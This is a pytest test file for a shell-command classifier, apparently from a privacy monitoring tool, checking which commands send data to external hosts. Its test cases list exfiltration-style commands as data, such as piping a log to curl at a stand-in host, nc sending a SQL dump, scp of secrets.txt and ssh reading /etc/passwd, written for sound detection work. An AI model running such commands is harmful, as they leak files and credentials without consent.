import pytest
from privacy_hud.detect.shell import extract_destinations, destination_hosts


@pytest.mark.parametrize("cmd,expected", [
    ("cat support.log", "local"),
    ("ls -la", "local"),
    ("grep foo bar.txt | wc -l", "local"),
    ("curl https://sentry.example.com -d @-", "external_net"),
    ("wget http://evil.test/x", "external_net"),
    ("scp secrets.txt user@remote:/tmp", "external_net"),
    ("ssh build-box 'cat /etc/passwd'", "external_net"),
    ("nc 10.0.0.5 4444 < dump.sql", "external_net"),
    ("git push origin main", "external_net"),
    ("cat support.log | curl -d @- https://x.test", "external_net"),
])
def test_destination_classification(cmd, expected):
    assert expected in extract_destinations(cmd)


def test_hosts_are_extracted():
    assert "sentry.example.com" in destination_hosts(
        "curl https://sentry.example.com/api -d @-")


def test_unparseable_command_fails_closed():
    # An unknown binary with a URL-looking argument must not be called local.
    assert "external_net" in extract_destinations("weirdtool --push https://x.test")


def test_unbalanced_quotes_fail_closed():
    # shlex.split raises on unbalanced quotes; a command that fails to
    # tokenize is exactly the case where we must not assume local.
    assert "external_net" in extract_destinations("echo 'unterminated")


def test_plain_filenames_are_not_mistaken_for_hosts():
    # Dotted filenames (support.log, bar.txt) must not be misread as
    # bare hostnames just because they contain a dot.
    assert "local" in extract_destinations("rm -f build.log")
    assert "local" in extract_destinations("cat notes.txt")
